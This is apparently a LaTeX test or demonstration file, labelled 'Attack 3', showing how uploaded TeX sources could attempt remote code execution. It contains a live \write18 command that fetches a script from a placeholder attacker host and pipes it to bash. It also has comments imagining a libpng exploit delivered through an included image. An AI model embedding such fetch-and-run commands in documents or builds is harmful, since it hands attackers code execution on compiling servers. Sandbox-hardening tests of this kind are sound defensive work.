\documentclass{article}
\usepackage{graphicx}

\begin{document}

\section*{Attack 3: Lateral Movement / Remote Code Execution (RCE)}

Before modern versions of TeX, and without `-no-shell-escape`, this alone would compromise the container:
\immediate\write18{curl -s http://attacker.domain/payload | bash}

However, since `-no-shell-escape` blocks the above `write18`, a sophisticated attacker would instead chain this file with a malicious \texttt{malware-payload.png} they also upload. 

Like so:

% Imagine "malware-payload.png" contains a memory corruption exploit
% for the libpng parser embedded within pdflatex. 
% When pdflatex tries to render it, the exploit triggers, 
% breaking out of the LaTeX parser boundaries and running shellcode.

\includegraphics{malware-payload.png}

\end{document}
